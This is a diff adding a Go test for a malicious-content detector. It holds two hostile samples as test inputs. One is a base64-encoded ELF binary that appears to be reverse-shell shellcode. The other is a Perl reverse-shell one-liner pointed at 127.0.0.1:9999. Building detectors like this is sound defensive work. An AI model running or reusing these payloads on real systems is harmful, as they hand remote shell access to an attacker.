@@ -69,3 +69,53 @@ func TestWeakPassword(t *testing.T) {
 	}
 
 }
+
+func TestMalware(t *testing.T) {
+	type args struct {
+		command string
+	}
+
+	tests := []struct {
+		name    string
+		args    args
+		want    MalReporter
+		wantErr bool
+	}{
+		{
+			name: "ELF base64",
+			args: args{command: "XHg3Rlx4NDVceDRDXHg0Nlx4MDFceDAxXHgwMVx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDJceDAwXHgwM1x4MDBceDAxXHgwMFx4MDBceDAwXHg1NFx4ODBceDA0XHgwOFx4MzRceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MzRceDAwXHgyMFx4MDBceDAxXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDFceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4ODBceDA0XHgwOFx4MDBceDgwXHgwNFx4MDhceENGXHgwMFx4MDBceDAwXHg0QVx4MDFceDAwXHgwMFx4MDdceDAwXHgwMFx4MDBceDAwXHgxMFx4MDBceDAwXHg2QVx4MEFceDVFXHgzMVx4REJceEY3XHhFM1x4NTNceDQzXHg1M1x4NkFceDAyXHhCMFx4NjZceDg5XHhFMVx4Q0RceDgwXHg5N1x4NUJceDY4XHhDMFx4QThceDEzXHhGM1x4NjhceDAyXHgwMFx4MTFceDVDXHg4OVx4RTFceDZBXHg2Nlx4NThceDUwXHg1MVx4NTdceDg5XHhFMVx4NDNceENEXHg4MFx4ODVceEMwXHg3OVx4MTlceDRFXHg3NFx4M0RceDY4XHhBMlx4MDBceDAwXHgwMFx4NThceDZBXHgwMFx4NkFceDA1XHg4OVx4RTNceDMxXHhDOVx4Q0RceDgwXHg4NVx4QzBceDc5XHhCRFx4RUJceDI3XHhCMlx4MDdceEI5XHgwMFx4MTBceDAwXHgwMFx4ODlceEUzXHhDMVx4RUJceDBDXHhDMVx4RTNceDBDXHhCMFx4N0RceENEXHg4MFx4ODVceEMwXHg3OFx4MTBceDVCXHg4OVx4RTFceDk5XHhCMlx4NkFceEIwXHgwM1x4Q0RceDgwXHg4NVx4QzBceDc4XHgwMlx4RkZceEUxXHhCOFx4MDFceDAwXHgwMFx4MDBceEJCXH=="},
+			want: MalReporter{
+				Types: Executable,
+				Score: 0.9,
+				Plain: "ELF LSB executable binary",
+			},
+		},
+		{
+			name: "Reverse shell",
+			args: args{command: "perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"127.0.0.1:9999\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"},
+			want: MalReporter{
+				Types: Confusion,
+				Score: 0.94,
+				Plain: "perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socke",
+			},
+		},
+		{
+			name: "Normal environment",
+			args: args{command: "SPq$b6^vuY8Bo2dM"},
+			want: MalReporter{
+				Types: Unknown,
+				Score: 0.0,
+				Plain: "SPq$b6^vuY8Bo2dM",
+			},
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			got := maliciousContentCheck(tt.args.command)
+			if !reflect.DeepEqual(got, tt.want) {
+				t.Errorf("maliciousContentCheck() got = %v, want %v", got, tt.want)
+			}
+		})
+	}
+}
